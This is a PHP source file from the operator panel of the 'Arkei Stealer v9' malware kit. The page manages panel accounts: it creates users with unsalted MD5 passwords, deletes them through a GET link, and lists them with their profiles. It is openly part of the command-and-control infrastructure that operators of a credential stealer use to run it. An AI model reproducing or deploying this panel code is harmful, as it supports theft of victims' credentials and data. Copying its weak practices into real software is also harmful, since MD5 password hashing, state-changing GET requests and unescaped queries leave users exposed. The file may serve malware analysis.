<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [users.php]
*    Users
*/

session_start();

error_reporting(0);

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$userProfile = $_SESSION["profile"];

if($userProfile != "0")
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit(0);
}

$pageName = "Users";

$login 		= checkParam($_POST["login"]);
$password 	= checkParam($_POST["password"]);
$profile 	= checkParam($_POST["profile"]);

$action 	= checkParam($_GET["action"]);
$id			= checkParam($_GET["id"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$login 		= mysqli_real_escape_string($database, $login);
	$password 	= mysqli_real_escape_string($database, $password);
	$profile 	= mysqli_real_escape_string($database, $profile);
	
	$password = md5($password);
	
	if($profile == "all")
	{
		$profile = "0";
	}
	
	if($login != null & $password != null & $profile != null)
	{
		$database->query("INSERT INTO `users`(`id`, `login`, `password`, `profile`) VALUES ('','$login','$password','$profile')");
	}
	
	if($action == "delete")
	{
		$id = mysqli_real_escape_string($database, $id);
		
		$database->query("DELETE FROM `users` WHERE `id`='$id'");
	}
	
	$profiles = $database->query("SELECT * FROM `profiles` ORDER BY `id`;");
	$users = $database->query("SELECT * FROM `users`;");
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="page-title">Create User</h4>
                        </div>
                    </div>
                </div>     
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="header-title"></h4>
    
                                <form class="form-horizontal" action="" method="POST">
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Login</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Your login" value="" name="login" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Password</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Your password" value="" name="password" type="password">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Profile</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="profile">
                                                <option value="all">All</option>
												<?php
												
												while ($profile = $profiles->fetch_assoc())
												{
													?><option value="<? echo $profile["id"]; ?>"><? echo $profile["Name"]; ?></option><?
												}
												
												?>
                                            </select>
                                        </div>
                                    </div>
									
									<button type="submit" class="btn btn-primary">Create</button>
    
                                </form>
    
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
                    </div><!-- end col -->
                </div> 
            </div> <!-- end container -->

	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
					<h4 class="page-title">Users</h4>
				</div>
			</div>
		</div> 
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
						<h4 class="header-title">Users</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>ID</th>
											<th>Login</th>
											<th>Profile</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<?php
									while ($user = $users->fetch_assoc())
									{
									
									?>
										<tr>
											<td><b>#<? echo $user["id"]; ?></b></td>
											<td><? echo $user["login"]; ?></td>
											<td><? 
												$profileID = $user["profile"];
												
												if($profileID == "0")
												{
													echo "All Profiles";
												}
												else
												{
													$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
													echo $profile["Name"];
												}
												
												?></td>
											<td><a href="users.php?action=delete&id=<? echo $user["id"]; ?>" >Delete</a></td>
										</tr>
										
									<?php
									}
									?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");

?>